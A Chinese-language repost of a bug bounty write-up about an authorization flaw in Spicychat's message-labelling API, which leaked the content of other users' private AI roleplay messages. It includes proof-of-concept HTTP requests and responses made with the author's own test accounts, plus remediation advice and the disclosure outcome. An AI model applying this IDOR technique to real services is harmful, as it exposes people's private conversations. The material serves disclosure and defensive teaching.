---
title: 0185.绕过人工智能聊天隐私：BOLA 漏洞如何泄露 Spicychat 上的私人信息（赏金 700 美元）
url: https://mp.weixin.qq.com/s/DhzyWnex0HDdLtpCMflViQ
source: Doonsec's feed
date: 2026-07-10
fetch_date: 2026-07-11T05:01:18.196278
---

# 0185.绕过人工智能聊天隐私：BOLA 漏洞如何泄露 Spicychat 上的私人信息（赏金 700 美元）

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MW9pCm89BuvVQxPr4nlH4KlAY2Z536EhRMwGDB5pNibP8EiciaQ6Wr003icYv4OPbW2D8LibxA5slcr9OfTkjM0HdLHfHu2Z7NFFG6u8Wt2gmXN4/0?wx_fmt=jpeg)

# 0185.绕过人工智能聊天隐私：BOLA 漏洞如何泄露 Spicychat 上的私人信息（赏金 700 美元）

原创

Kenjisubagja
Kenjisubagja

Rsec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

本文章仅用网络安全研究学习，请勿使用相关技术进行违法犯罪活动。

声明：本文搬运自互联网，如你是原作者，请联系我们！

类型：BOLA

各位漏洞赏金猎人和网络安全爱好者们，大家好！在本文中，我想分享我最近发现的一个中等严重程度的漏洞，该漏洞为我赢得了 **700 美元的赏金**。

此次攻击的目标是 **Spicychat** ，这是一个热门平台，用户可以在该平台上与 AI 角色进行角色扮演和对话。在这样一个用户与 AI 进行高度私密、敏感或露骨的角色扮演聊天应用中，隐私是绝对的重中之重。

在评估过程中，我发现了一个**对象级授权失效（BOLA/IDOR）** 漏洞。虽然用于读取私密对话的主要端点完全安全，但用于“标记”或“评分”消息的辅助端点却完全缺少授权检查。这一漏洞不仅允许攻击者篡改其他用户的消息数据，还能泄露私密消息的明文内容。

以下是该漏洞的技术分析。

## 架构与缺陷

与许多现代平台一样，Spicychat 允许用户对 AI 回复进行评分或标记（例如，将消息标记为“有趣”、“好”或“坏”），以改进 AI 模型。

查看对话的主要入口点会正确检查已认证用户是否为该聊天的发起者：

```
GET /api/v1/characters/[REDACTED]/messages/[CONVERSATION_ID]
```

如果未经授权的用户尝试查看会话，服务器会正确地抛出 `401 Conversation view operation denied` 。核心授权边界非常牢固。

然而，开发人员常常忘记对辅助功能性端点应用同样的严格检查。我发现负责更新消息标签的端点没有验证请求者是否确实是父对话的所有者：

```
POST /api/v1/messages/{message_id}/label
```

如果攻击者知道或能够获取有效的 `message_id` （UUID），他们就可以为其添加标签。服务器不仅会接受这种未经授权的修改，**还会将整个目标消息对象反映到响应正文中**，从而有效地泄露私聊内容。

## 概念验证（利用步骤）

为了在不影响真实用户的情况下安全地演示这一点，我设置了两个受控测试帐户：**帐户 A** （受害者）和**帐户 B** （攻击者）。

### 第一步：受害者发起私密对话

账户 A 与 AI 角色发起私聊并生成一条消息。API 会为这条消息分配一个 UUID：

```
{  "conversation_id": "fb5c06dc-e800-4042-8df6-[REDACTED]",  "messages": [    {      "conversation_id": "fb5c06dc-e800-4042-8df6-[REDACTED]",      "role": "user",      "id": "19fc6892-e1f2-4fca-8da5-[REDACTED]",      "content": "Secret-Private-Message-Content-Here",      "createdAt": 1778876803910    }  ]}
```

### 步骤二：验证安全基线

账户 B（攻击者）尝试使用标准聊天查看端点直接读取账户 A 的对话。

```
GET /api/v1/characters/[REDACTED]/messages/fb5c06dc-e800... HTTP/2Authorization: Bearer <ACCOUNT_B_TOKEN>
```

**结果：** 服务器采取安全措施，拒绝了该请求。

```
{  "status": 401,  "message": "Conversation view operation denied.",  "errorCode": "SC-001-1803"}
```

### 步骤 3：通过消息标签绕过 BOLA

由于直接访问被阻止，账户 B 使用属于账户 A 的特定 `message_id` 来攻击存在漏洞的标签端点：

```
POST /api/v1/messages/19fc6892-e1f2-4fca-8da5-[REDACTED]/label HTTP/2Host: api.[REDACTED].comAuthorization: Bearer <ACCOUNT_B_TOKEN>Content-Type: application/json
```

```
{  "message_id": "19fc6892-e1f2-4fca-8da5-[REDACTED]",  "label": "funny"}
```

**易受攻击的响应：** 服务器返回 `200 OK` ，并将整个被篡改的消息对象返回给攻击者：

```
{  "message": "success",  "result": {    "conversation_id": "fb5c06dc-e800-4042-8df6-[REDACTED]",    "role": "user",    "id": "19fc6892-e1f2-4fca-8da5-[REDACTED]",    "content": "Secret-Private-Message-Content-Here",    "createdAt": 1778876803910,    "rating": "funny"  }}
```

影响

通过绕过预设的授权模型，已认证的攻击者可以：

* **披露私人数据：**

  使用成功的标签响应作为消息披露预言机来读取私人、露骨或敏感的 AI 角色扮演聊天记录。
* **篡改数据（数据完整性）：**

  修改其他用户拥有的私人消息的评分/标签元数据，可能会污染平台的 AI 训练反馈循环和质量指标。

虽然利用此漏洞需要知道 `message_id` UUID（这增加了防止大规模抓取的难度），但完全缺乏对象级授权仍然对目标用户构成重大的隐私风险。

## 补救措施

这个问题的解决方法很简单，但至关重要。后端在接受任何标签更新或状态变更之前，必须：

* 在服务器端解析 `message_id` 以找到其父 `conversation_id` 。
* 检查访问控制列表 (ACL) 以确认请求用户是否拥有或被授权查看该特定对话。
* 如果授权失败，则在处理变更或返回任何消息内容之前，立即返回 `403 Forbidden` 或 `404 Not Found` 。

Spicychat 的安全团队专业地处理了这份报告，部署了补丁程序，并向发现漏洞者悬赏了 700 美元。

## 结论

在排查 BOLA/IDOR 漏洞时，不要只关注主要端点（ `GET /profile` 、 `GET /messages` ）。务必检查次要功能，例如添加收藏、内容评分、举报或标记项目。开发人员往往只关注前门安全，却忽略了侧门的安全防护。

感谢阅读，祝您编程愉快！

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs98K2tqBAticMskicyUAjtQoicZSdgKiaj1G5KGKOyd7A6paRrrHhz2JVvU3RLRsboI6MibP7Nl68yVAyTw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过